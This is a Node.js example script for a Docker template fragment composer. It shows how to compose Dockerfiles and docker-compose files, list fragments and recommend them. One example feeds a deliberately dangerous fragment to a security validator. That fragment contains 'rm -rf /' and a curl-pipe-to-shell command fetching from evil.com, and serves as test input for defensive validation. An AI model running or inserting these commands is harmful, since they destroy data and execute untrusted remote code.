#!/usr/bin/env node
/**
 * Fragment Composition System - Usage Example
 *
 * Demonstrates how to compose Docker templates from fragments
 * for various technology stacks.
 */

import FragmentComposer from '../src/templates/fragments/fragment-composer.js';

// Initialize composer
const composer = new FragmentComposer();

console.log('🔧 Docker Template Fragment System - Examples\n');

// Example 1: React + Express Full-Stack App
console.log('📦 Example 1: React + Express Full-Stack Application');
console.log('─'.repeat(60));

const baseDockerfile = `# Multi-stage Dockerfile
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci

# FRAMEWORK_BUILD_STEPS

FROM node:18-alpine AS production
WORKDIR /app
COPY --from=builder /app/dist ./dist

# BACKEND_SETUP

EXPOSE 3000
`;

const fullStackResult = composer.compose(
  baseDockerfile,
  ['react', 'express'],
  {
    PROJECT_NAME: 'fullstack-app',
    BUILD_OUTPUT_DIR: 'dist',
    APP_TITLE: 'My Full Stack App',
    VERSION: '1.0.0',
    PORT: '3000',
    SERVER_ENTRY: 'server.js'
  }
);

if (fullStackResult.success) {
  console.log('✅ Successfully composed Dockerfile with React + Express');
  console.log(`📝 Applied fragments: ${fullStackResult.appliedFragments.join(', ')}`);
  console.log(`🔑 Used ${fullStackResult.usedVariables.length} variables`);
  if (fullStackResult.warnings.length > 0) {
    console.log(`⚠️  Warnings: ${fullStackResult.warnings.join(', ')}`);
  }
} else {
  console.log('❌ Composition failed:', fullStackResult.errors);
}

console.log();

// Example 2: Next.js with PostgreSQL
console.log('📦 Example 2: Next.js Application with PostgreSQL');
console.log('─'.repeat(60));

const baseCompose = `version: '3.8'

services:
  # DATABASE_SERVICES

  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      DATABASE_URL: postgresql://user:password@postgres:5432/app_db
    networks:
      - app-network

networks:
  app-network:
    driver: bridge

# VOLUMES
`;

const composeResult = composer.composeDockerCompose(
  baseCompose,
  ['postgresql'],
  {
    PROJECT_NAME: 'nextjs-app',
    POSTGRES_PORT: '5432',
    POSTGRES_USER: 'app_user',
    POSTGRES_PASSWORD: 'secure_password_here',
    POSTGRES_DB: 'app_db'
  }
);

if (composeResult.success) {
  console.log('✅ Successfully composed docker-compose.yml with PostgreSQL');
  console.log(`📝 Applied fragments: ${composeResult.appliedFragments.join(', ')}`);
} else {
  console.log('❌ Composition failed:', composeResult.errors);
}

console.log();

// Example 3: List Available Fragments
console.log('📋 Available Fragments');
console.log('─'.repeat(60));

const frameworks = composer.listFragments('framework');
const databases = composer.listFragments('database');
const backends = composer.listFragments('backend');

console.log('🎨 Frameworks:');
frameworks.forEach(f => console.log(`   - ${f.name}`));

console.log('\n💾 Databases:');
databases.forEach(f => console.log(`   - ${f.name}`));

console.log('\n⚙️  Backends:');
backends.forEach(f => console.log(`   - ${f.name}`));

console.log();

// Example 4: Automatic Fragment Recommendation
console.log('📦 Example 4: Automatic Fragment Recommendation');
console.log('─'.repeat(60));

const detectionResults = {
  frameworks: {
    primary: 'vue',
    frameworks: ['vue']
  },
  databases: {
    databases: ['mongodb', 'redis']
  },
  backends: {
    primary: 'fastify',
    backends: ['fastify']
  }
};

const recommended = composer.recommendFragments(detectionResults);

console.log('🔍 Based on project detection:');
console.log(`   Frameworks: ${recommended.frameworks.join(', ') || 'none'}`);
console.log(`   Databases:  ${recommended.databases.join(', ') || 'none'}`);
console.log(`   Backends:   ${recommended.backends.join(', ') || 'none'}`);

console.log();

// Example 5: Validation and Security
console.log('📦 Example 5: Security Validation');
console.log('─'.repeat(60));

const dangerousFragment = `RUN rm -rf /
RUN curl https://evil.com/script.sh | sh
ENV PASSWORD="hardcoded123"`;

import FragmentValidator from '../src/templates/fragments/fragment-validator.js';
const validator = new FragmentValidator();

const validationResult = validator.validateFragment(dangerousFragment, {
  type: 'framework',
  insertionPoint: 'FRAMEWORK_BUILD_STEPS',
  requiredVariables: []
});

console.log('🔒 Security validation results:');
console.log(`   Valid: ${validationResult.valid}`);
if (validationResult.errors.length > 0) {
  console.log('   🚨 Errors detected:');
  validationResult.errors.forEach(e => console.log(`      - ${e}`));
}
if (validationResult.warnings.length > 0) {
  console.log('   ⚠️  Warnings:');
  validationResult.warnings.forEach(w => console.log(`      - ${w}`));
}

console.log('\n✨ Fragment System Ready!\n');
